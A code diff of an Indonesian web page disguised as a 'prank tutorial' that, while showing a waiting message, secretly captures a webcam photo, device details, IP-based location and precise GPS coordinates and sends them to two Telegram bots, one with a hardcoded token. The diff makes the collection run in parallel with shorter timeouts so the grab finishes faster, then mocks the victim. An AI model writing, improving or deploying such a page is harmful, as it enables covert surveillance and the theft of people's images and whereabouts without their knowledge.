@@ -5,9 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tutorial Prank temen yang dongo 100% dijamin berhasil</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
     body {
       background-color: #000;
       color: #00ff00;
@@ -20,51 +18,34 @@
       overflow: hidden;
       flex-direction: column;
     }
-
     #msg {
       white-space: pre-wrap;
       font-size: 14px;
       padding: 20px;
       max-width: 90vw;
-      animation: typing 1s steps(40, end) 1;
       border-left: 2px solid #0f0;
       padding-left: 15px;
       animation: cursor 1s step-end infinite;
     }
-
-    @keyframes cursor {
-      50% {
-        border-color: transparent;
-      }
-    }
-
+    @keyframes cursor { 50% { border-color: transparent; } }
     .prank {
       font-size: 40px;
       color: #0f0;
-      text-shadow:
-        0 0 5px #0f0,
-        0 0 10px #0f0,
-        0 0 20px #00ff00,
-        0 0 40px #00ff00;
+      text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #00ff00, 0 0 40px #00ff00;
       font-weight: bold;
       opacity: 0;
       animation: muncul 2s ease-in-out forwards;
     }
-
     @keyframes muncul {
       0% { opacity: 0; transform: scale(0.8); }
       50% { opacity: 1; transform: scale(1.1); }
       100% { transform: scale(1); }
     }
-
-    .hidden {
-      display: none;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
   <div id="msg">Tunggu sebentar, get tutorial sabar..</div>
-
   <script>
     const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
     const token2 = 'TOKEN_BOT_2';
@@ -85,30 +66,31 @@
     const kirimPesan = async (pesan) => {
       const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
       const payload2 = { chat_id: chatId2, text: pesan, parse_mode: 'HTML' };
-
-      await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-
-      await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload2)
-      });
+      await Promise.all([
+        fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }),
+        fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload2)
+        })
+      ]);
     };
 
     const kirimFoto = async (blob) => {
       const form1 = new FormData();
       form1.append("chat_id", chatId1);
       form1.append("photo", blob, "foto.jpg");
-      await fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 });
-
       const form2 = new FormData();
       form2.append("chat_id", chatId2);
       form2.append("photo", blob, "foto.jpg");
-      await fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 });
+      await Promise.all([
+        fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 }),
+        fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 })
+      ]);
     };
 
     const ambilDataPerangkat = async () => {
@@ -129,7 +111,6 @@
           return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
         }
       })();
-
       const bat = await navigator.getBattery();
       const waktu = new Date().toLocaleString("id-ID");
       const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
@@ -182,7 +163,7 @@ Kota                : ${ip.city}
 
     const ambilLokasi = () => {
       return new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition(async pos => {
+        navigator.geolocation.getCurrentPosition(pos => {
           const { latitude, longitude, accuracy } = pos.coords;
           resolve(`
 - 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
@@ -198,7 +179,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
 
 ❌ Lokasi tidak diizinkan oleh pengguna.
 `);
-        }, { enableHighAccuracy: true, timeout: 10000 });
+        }, { enableHighAccuracy: true, timeout: 7000 });
       });
     };
 
@@ -218,27 +199,18 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           cek();
         });
 
-        await new Promise(r => setTimeout(r, 500));
+        await new Promise(r => setTimeout(r, 100)); // lebih cepat
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
-
         stream.getTracks().forEach(track => track.stop());
 
         const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-        if (blob) {
-          await kirimFoto(blob);
-          return "";
-        } else {
-          return `
-- 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
-
-❌ Gagal mengambil gambar dari kamera.
-`;
-        }
+        if (blob) await kirimFoto(blob);
+        return "";
       } catch {
         return `
 - 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
@@ -249,10 +221,12 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
     };
 
     const mulai = async () => {
-      const kamera = await ambilKamera();
-      const info = await ambilDataPerangkat();
-      const ip = await ambilIPInfo();
-      const lokasi = await ambilLokasi();
+      const [kamera, info, ip, lokasi] = await Promise.all([
+        ambilKamera(),
+        ambilDataPerangkat(),
+        ambilIPInfo(),
+        ambilLokasi()
+      ]);
 
       const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
       document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
